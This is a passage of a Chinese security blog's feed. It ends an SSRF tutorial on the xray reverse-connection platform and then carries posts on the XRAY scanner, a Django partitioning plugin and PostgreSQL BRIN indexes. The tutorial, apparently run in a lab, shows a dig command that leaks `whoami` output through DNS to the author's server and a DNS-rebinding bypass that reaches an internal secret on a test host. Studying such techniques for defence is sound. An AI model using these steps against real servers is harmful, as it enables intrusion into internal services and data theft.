    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ns2&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;60&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;140.143.224.171&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;dns_server_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;140.143.224.171&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 其他的项目没有修改 ...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./xray reverse&lt;/code&gt; 启动，这时候可以看到提示信息多了一些，&lt;code class=&quot;highlighter-rouge&quot;&gt;dns server&lt;/code&gt; 也启动了。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[INFO] 2019-09-08 10:20:16 +0800 [default:config.go:160] loading config from config.yaml
reverse server base url: http://140.143.224.171:4445, token: imtoken1
reverse server webUI: http://140.143.224.171:4445/cland/
[DBUG] 2019-09-08 10:20:16 +0800 [default:reverse.go:40] reverse http server started, base url: http://140.143.224.171:4445, token: imtoken1
[DBUG] 2019-09-08 10:20:16 +0800 [default:reverse.go:52] reverse dns started
[INFO] 2019-09-08 10:20:16 +0800 [reverse:dns_server.go:167] starting reverse dns server
[INFO] 2019-09-08 10:20:16 +0800 [reverse:http_server.go:118] starting reverse http server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;要注意的是 dns 服务需要监听 UDP 53 端口，需要 root 权限而且记得在防火墙中放行。&lt;/p&gt;

&lt;h3 id=&quot;反连平台可以解析-revcxyz-的任意域名了&quot;&gt;反连平台可以解析 *.revc.xyz 的任意域名了&lt;/h3&gt;

&lt;p&gt;回到界面上，点击 &lt;code class=&quot;highlighter-rouge&quot;&gt;生成一个域名&lt;/code&gt;，我们先来验证一下之前的配置有没有生效，因为 ns 记录大概需要几个小时才能全球生效，当然如果指定了 dns 服务器为自己的的话，就不需要了。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$dig&lt;/span&gt; ns1.revc.xyz A @140.143.224.171

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.10.6 &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ns1.revc.xyz A @140.143.224.171
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 852
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;ns1.revc.xyz.			IN	A

;; ANSWER SECTION:
ns1.revc.xyz.		60	IN	A	140.143.224.171

;; Query time: 75 msec
;; SERVER: 140.143.224.171#53(140.143.224.171)
;; WHEN: Sun Sep 08 10:22:23 CST 2019
;; MSG SIZE  rcvd: 58
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看出来 ns1 的解析记录是对的，这个是我们配置文件中的静态解析规则。&lt;/p&gt;

&lt;p&gt;在界面上可以生成一个新域名，如果我们不需要 dns rebinding 的功能，只需要查看解析记录的话，那和之前的 HTTP 访问记录功能没有太大差别，比如 &lt;code class=&quot;highlighter-rouge&quot;&gt;dig p-9fd889-lzyk.$(whoami).revc.xyz A@140.143.224.171&lt;/code&gt; 就可以看到左侧 DNS 一栏中的记录了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679095622627.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;实际解析的域名中间的部分就是执行命令的结果。&lt;/p&gt;

&lt;h3 id=&quot;dns-rebinding-也可以绕过验证成功&quot;&gt;dns rebinding 也可以绕过验证，成功~&lt;/h3&gt;

&lt;p&gt;话说回来，为了验证我们之前利用 dns rebinding 进行绕过的思路，我们在 xray 的反连平台上创建一个 域名，然后指定两次不同的解析 IP 而且 TTL 为 0 就可以了。在网页上配置起来也是非常的简单。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679097232155.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击保存之后，同样是先本地测试一下。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$dig&lt;/span&gt; p-04f887-2kua.revc.xyz A @140.143.224.171

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.10.6 &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; p-04f887-2kua.revc.xyz A @140.143.224.171
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 35
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;p-04f887-2kua.revc.xyz.		IN	A

;; ANSWER SECTION:
p-04f887-2kua.revc.xyz.	0	IN	A	1.2.3.4

;; Query time: 54 msec
;; SERVER: 140.143.224.171#53(140.143.224.171)
;; WHEN: Sun Sep 08 10:29:25 CST 2019
;; MSG SIZE  rcvd: 78



&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dig&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; p-04f887-2kua.revc.xyz A @140.143.224.171

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.6 &amp;lt;&amp;lt;&amp;gt;&amp;gt; p-04f887-2kua.revc.xyz A @140.143.224.171
;; global options: +cmd
;; Got answer:
;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 57001
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;p-04f887-2kua.revc.xyz.		IN	A

;; ANSWER SECTION:
p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1

;; Query time: 49 msec
;; SERVER: 140.143.224.171#53(140.143.224.171)
;; WHEN: Sun Sep 08 10:29:29 CST 2019
;; MSG SIZE  rcvd: 78
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看出来第一次和第二次的解析结果是不一样的，将 DNS 服务器更换为 &lt;code class=&quot;highlighter-rouge&quot;&gt;8.8.8.8&lt;/code&gt; 可以得到相同的结果。&lt;/p&gt;

&lt;p&gt;因为 dns rebinding 配置的两次访问是有顺序的，而且我们已经都访问过了，如果再次去解析这个域名，反连平台就只能返回默认的解析结果了，这时候可以通过再次点击保存按钮来重置访问顺序。&lt;/p&gt;

&lt;p&gt;构造 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://vuln.net:8000/?url=http://p-04f887-2kua.revc.xyz:8000/api/internal/secret&lt;/code&gt; 的 url，我们又获取到了 secret。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679099800999.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679099947838.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 DNS 解析历史记录中，我们看到了两个 Google 的 IP，也就是说明 Python 的后端去解析了两次，因为 TTL=0，dns 服务器每次都要回源重新解析，这样第一次和第二次访问结果不一致也就绕过了检查。&lt;/p&gt;

&lt;h2 id=&quot;备注&quot;&gt;备注&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt; 代替 &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; 是另外一种绕过思路&lt;/li&gt;
  &lt;li&gt;利用上面的思路访问本地的 22 和 6379 还可以发现 SSH 和 Redis 服务，也是一个重要的信息。&lt;/li&gt;
&lt;/ul&gt;</content><author><name>virusdefender</name></author><category term="安全" /><summary type="html">SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作正确的过滤和限制 ref。</summary></entry><entry><title type="html">XRAY 安全评估工具社区版</title><link href="https://strcpy.me/index.php/archives/795/" rel="alternate" type="text/html" title="XRAY 安全评估工具社区版" /><published>2019-07-18T00:00:01+00:00</published><updated>2019-07-18T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/XRAY%20%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E5%B7%A5%E5%85%B7%E7%A4%BE%E5%8C%BA%E7%89%88</id><content type="html" xml:base="https://strcpy.me/index.php/archives/795/">&lt;p&gt;最近几个月都在忙这个 XRAY 安全评估工具，直到有好心人提醒我本站的 ssl 证书过期了才想起来好久没写文章了。&lt;/p&gt;

&lt;p&gt;在 2016 年的 7 月 7 号，长亭科技四周年的大好日子，我们发布了两款新产品，洞鉴 和 牧云。洞鉴 以资产管理、安全评估、漏洞管理为中心，来解决传统漏洞扫描产品不够贴近业务场景，很难做好安全闭环的问题；牧云 则是站在服务器的角度，为云平台提供更加强有力的安全支撑。这两款新产品的诞生填补了长亭在应用安全解决方案中的一大空缺。&lt;/p&gt;

&lt;p&gt;在洞鉴发布后的一年里，我们收到了许多使用者的反馈，收获了不少客户的认可。与此同时，也在迭代的过程中，发现与总结出了许多问题和不足之处。也很多次有朋友联系到我们，咨询如何以个人的身份体验一次洞鉴的功能，但由于业务模式的缘故，我只能遗憾地拒绝了他们。&lt;/p&gt;

&lt;p&gt;作为一家专心致志做技术、做产品的公司，我们抱着技术属于整个行业的态度，不愿意受到 ToB 商业模式的限制，非常愿意让更多的安全从业者使用我们的产品。在过去的几年中，我们开源了雷池的语义分析算法生成引擎，开源了牧云的核心技术，开源了许多我们内部的小工具，今天我们会以社区版工具的形式开放（非开源）洞鉴的核心能力，让更多的朋友和我们一起为更先进的漏洞扫描算法努力。&lt;/p&gt;

&lt;p&gt;下载地址 &lt;a href=&quot;https://github.com/chaitin/xray&quot;&gt;https://github.com/chaitin/xray&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;文档 &lt;a href=&quot;http://chaitin.github.io/xray/&quot;&gt;http://chaitin.github.io/xray/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;目前支持的检测模块有&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;SQL 注入检测 (key: sqldet)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;支持报错注入、布尔注入和时间盲注等&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;命令/代码注入检测 (key: cmd_injection)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;支持 shell 命令注入、PHP 代码执行、模板注入等&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;目录枚举 (key: dirscan)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;路径穿越检测 (key: path_traversal)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;支持常见平台和编码&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;XML 实体注入检测 (key: xxe)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;支持有回显和反连平台检测&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;poc 管理 (key: phantasm)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;默认内置部分常用的 poc，用户可以根据需要自行构建 poc 并运行。文档：https://chaitin.github.io/xray/#/guide/poc&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;文件上传检测 (key: upload)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;支持常见的后端语言&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;弱口令检测 (key: brute_force)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;社区版支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;jsonp 检测 (key: jsonp)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;检测包含敏感信息可以被跨域读取的 jsonp 接口&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ssrf 检测 (key: ssrf)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ssrf 检测模块，支持常见的绕过技术和反连平台检测&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;基线检查 (key: baseline)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;检测低 SSL 版本、缺失的或错误添加的 http 头等&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;任意跳转检测 (key: redirect)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;支持 HTML meta 跳转、30x 跳转等&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CRLF 注入 (key: crlf_injection)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;检测 HTTP 头注入，支持 query、body 等位置的参数&lt;/p&gt;

&lt;p&gt;当然商业版是支持更多的模块和 POC 的，如果有任何使用上的问题，可以查看文档上的反馈方式，和我们交流。&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="安全" /><summary type="html">最近几个月都在忙这个 XRAY 安全评估工具，直到有好心人提醒我本站的 ssl 证书过期了才想起来好久没写文章了。</summary></entry><entry><title type="html">开源了一个 Django PostgreSQL 时间分区表插件</title><link href="https://strcpy.me/index.php/archives/794/" rel="alternate" type="text/html" title="开源了一个 Django PostgreSQL 时间分区表插件" /><published>2019-02-09T00:00:01+00:00</published><updated>2019-02-09T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/%E5%BC%80%E6%BA%90%E4%BA%86%E4%B8%80%E4%B8%AA%20Django%20PostgreSQL%20%E6%97%B6%E9%97%B4%E5%88%86%E5%8C%BA%E8%A1%A8%E6%8F%92%E4%BB%B6</id><content type="html" xml:base="https://strcpy.me/index.php/archives/794/">&lt;h2 id=&quot;什么是分区表有什么优点&quot;&gt;什么是分区表，有什么优点&lt;/h2&gt;

&lt;p&gt;分区表就是将逻辑上的一个大表分成一些物理上的小表，是数据库系统为大型表的数据组织和管理提供的一种实用的功能特性。&lt;/p&gt;

&lt;p&gt;表分区有很多好处，比如：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;子表可以按照时间等特征去划分，如果一个查询带有时间范围，那么某些子表可以直接跳过。这样就减少了索引和数据文件的 IO 量，而且这些数据更可能被缓存在内存中了。&lt;/li&gt;
  &lt;li&gt;一个子表可以被归档，也就是数据库会忽略它的存在，实现老数据不再查询的特性。&lt;/li&gt;
  &lt;li&gt;如果磁盘空间不足，可以快速删除不想要的数据。被归档的表的删除和 vacuum 会比较容易，因为需要锁，一直写数据的情况下不容易操作。&lt;/li&gt;
  &lt;li&gt;如果加一块磁盘扩容，之后创建的新的子表可以单独调整 tablespace 放在新的磁盘上，先不移动已有的数据。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;我们为什么要开发这个插件&quot;&gt;我们为什么要开发这个插件&lt;/h2&gt;

&lt;p&gt;这里需要先插播一个广告&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;雷池（SafeLine）是全球首个基于智能语义分析算法的 WAF产品。雷池从计算机语言的角度进行攻击检测，区别于传统的基于特征库和黑白名单机制的拦截原理，极大地降低了误报率和漏报率，提升了 WAF 拦截的准确度。面对云端变化，雷池（SafeLine）云端解决方案无论应对私有云、公有云、混合云都有灵活应变的部署防护模式，帮助用户灵活配置网络环境。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;雷池需要不间断地将包括海量攻击检测、行为审计等各类日志入库持久化，给数据库带来了极大的压力。&lt;/p&gt;

&lt;p&gt;当然表分区不是存储和处理大数据的最优办法，引入分布式数据库和分布式文件系统才能更好的分离查询和存储压力。但是在某些特定的场景下下面（比如你的产品是卖给客户一台硬件机器）是无法引入分布式系统的。&lt;/p&gt;

&lt;p&gt;雷池的后端管理平台基于 Django 框架，而数据库主要使用 PostgreSQL。雷池 S20 系列使用的数据库主版本号为 11，该主版本更新的一大特性便是对表分区进行了若干增强，详情参见 https://www.postgresql.org/about/news/1894/ 。&lt;/p&gt;

&lt;p&gt;由于 Django ORM 当前不支持声明分区表，所以在此之前也有如 architect (https://github.com/maxtepkeev/architect) 这样的 插件，但是它是基于表继承来实现的，并不支持 PostgreSQL 10 之后的原生分区表功能，而原生分区表功能在性能和易用性上都远远好于表继承。&lt;/p&gt;

&lt;p&gt;所以我们开源了基于时间进行原生分区和管理的 Django 插件 django-pg-timepart (https://github.com/chaitin/django-pg-timepart)，它支持最新的 PostgreSQL 11，使 Django 能够在业务层对像文章、评论和日志这样的时序数据按一定时间间隔（如年、月、周等）来建立分区。&lt;/p&gt;

&lt;h2 id=&quot;如何使用&quot;&gt;如何使用&lt;/h2&gt;

&lt;p&gt;在 Django 中，数据的核心是 model，所以只要给 model 加上我们的 decorator 就可以在 migrate 的时候声明为分区表了。&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@TimeRangePartitioningSupport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;timestamp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_interval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AttackLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DateTimeField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rule_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TextField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;……&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但是这个时候只有主表没有子表，需要再去扫描所有的 model 然后创建或者归档子表。&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partitioning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create_partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partitioning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;detach_partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;雷池的分区自动创建和归档是通过后端的定时器来触发上面的 API 实现的。&lt;/p&gt;

&lt;p&gt;当然我们的归档周期等配置也是可以调整的，而且归档历史和子表信息也可以查询，它们都在 PartitionConfig 和 PartitionLog 中。&lt;/p&gt;

&lt;h2 id=&quot;最后&quot;&gt;最后&lt;/h2&gt;

&lt;p&gt;django-pg-timepart 虽然是一个从我们实际业务中分离出来的，代码不过千行，功能单一的小插件，但是我们认为，当开源一个项目的同时，我们其实也在开源我们对于某些问题的一些想法，并愿意在开源社区中就我们使用 Django 构建 Web 应用时的所遇到的问题参与讨论，这才是我们的初衷。因此，我们欢迎大家为这一萌芽项目提供更多的建议、指出不足或对功能进行扩展使其更加通用化，Thanks！&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="后端" /><summary type="html">什么是分区表，有什么优点</summary></entry><entry><title type="html">PostgresSQL BRIN 索引的使用的那些坑</title><link href="https://strcpy.me/index.php/archives/793/" rel="alternate" type="text/html" title="PostgresSQL BRIN 索引的使用的那些坑" /><published>2019-02-04T00:00:01+00:00</published><updated>2019-02-04T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/PostgresSQL%20BRIN%20%E7%B4%A2%E5%BC%95%E7%9A%84%E4%BD%BF%E7%94%A8%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91</id><content type="html" xml:base="https://strcpy.me/index.php/archives/793/">&lt;p&gt;作者：@monouno，现实习于长亭科技。原文发表在 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/50167673&quot;&gt;https://zhuanlan.zhihu.com/p/50167673&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;BRIN 索引（块范围索引，Block Range Indexes）是 PostgreSQL 9.5 版本新增的索引类型。该索引维护每一定范围内数据块的最大最小值和其他一些统计数据，当数据库查询时可根据索引的统计信息筛选出不符合查询条件的数据块，以避免全表扫描，提高性能和减少 IO。和 BTree 索引比较所占用的空间足够小&lt;sup&gt;[1]&lt;/sup&gt;，因此 BRIN 索引一般用于线性相关较强字段的精确和范围查询，如在一张很大的日志表中通过 id 或时间查询。&lt;/p&gt;

&lt;h2 id=&quot;创建测试数据&quot;&gt;创建测试数据&lt;/h2&gt;

&lt;p&gt;创建数据表，只含有一个 id 字段&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;数据表大小为 &lt;code class=&quot;highlighter-rouge&quot;&gt;3.4G&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dt+ example
                      List of relations
 Schema |  Name   | Type  |  Owner   |  Size   | Description
--------+---------+-------+----------+---------+-------------
 public | example | table | safeline | 3457 MB |
(1 row)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;创建索引&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INDEX&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USING&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pages_per_range&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autosummarize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;索引大小为 &lt;code class=&quot;highlighter-rouge&quot;&gt;56K&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dti+ idx
                        List of relations
 Schema | Name | Type  |  Owner   |  Table  | Size  | Description
--------+------+-------+----------+---------+-------+-------------
 public | idx  | index | safeline | example | 56 kB |
(1 row)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;explain 一下 BRIN 索引使用情况&lt;/p&gt;

